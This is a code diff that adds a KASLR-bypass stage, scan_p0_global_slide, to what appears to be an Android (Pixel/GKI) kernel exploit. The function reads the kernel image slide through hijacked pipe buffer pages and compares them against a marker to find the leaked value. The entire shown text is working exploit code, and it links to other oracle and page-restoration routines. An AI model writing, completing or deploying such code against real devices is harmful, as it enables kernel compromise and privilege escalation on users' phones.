@@ -1095,6 +1095,49 @@ uintptr_t scan_p0_pipe_oracle(void) {
   return best_slide;
 }
 
+#if defined(P0_SLIDE_VIA_GLOBAL) && P0_SLIDE_VIA_GLOBAL
+/* Pixel/GKI slide leak: the probe redirects a pipe slot at the STATIC
+ * linear alias of the image page holding `kimage_voffset`
+ * (P0_ORACLE_PROBE_OFFSET = page-aligned P0_SLIDE_GLOBAL_OFF).  Scan the
+ * reclaim pipes for the page that no longer carries the marker and
+ * extract the u64 at (P0_SLIDE_GLOBAL_OFF & 0xfff).  The read size
+ * matches the proven fingerprint scan (single slot, no blocking). */
+uint64_t scan_p0_global_slide(void) {
+  size_t in_page = (size_t)(P0_SLIDE_GLOBAL_OFF & (PAGE_SIZE - 1));
+  size_t scan_size = in_page + sizeof(uint64_t);
+  uint64_t value = 0;
+  int changed_pages = 0;
+
+  for (size_t pipe_index = 0; pipe_index < PIPE_RECLAIM; pipe_index++) {
+    unsigned char page[PAGE_SIZE];
+    memset(page, 0, sizeof(page));
+    if (!pipe_read_full(pipe_fds_reclaim[pipe_index][0], page,
+                        scan_size)) {
+      pr_warning("p0 global scan read failed pipe=%zu errno=%d\n",
+                 pipe_index, errno);
+      return 0;
+    }
+    if (memcmp(page, "RMG-P0-PIPE", 11) == 0) {
+      continue;
+    }
+    changed_pages++;
+    memcpy(&value, page + in_page, sizeof(value));
+    pr_info("p0 global sample pipe=%zu in_page=%zu value=%016llx\n",
+            pipe_index, in_page, (unsigned long long)value);
+    if (value != 0) {
+      break;
+    }
+  }
+
+  pr_info("p0 global slide changed=%d value=%016llx\n",
+          changed_pages, (unsigned long long)value);
+  if (changed_pages != 1 || value == 0) {
+    return 0;
+  }
+  return value;
+}
+#endif
+
 int restore_p0_oracle_pages(int fd) {
   if (!p0_gate_page_struct && !p0_probe_page_struct) {
     return 1;
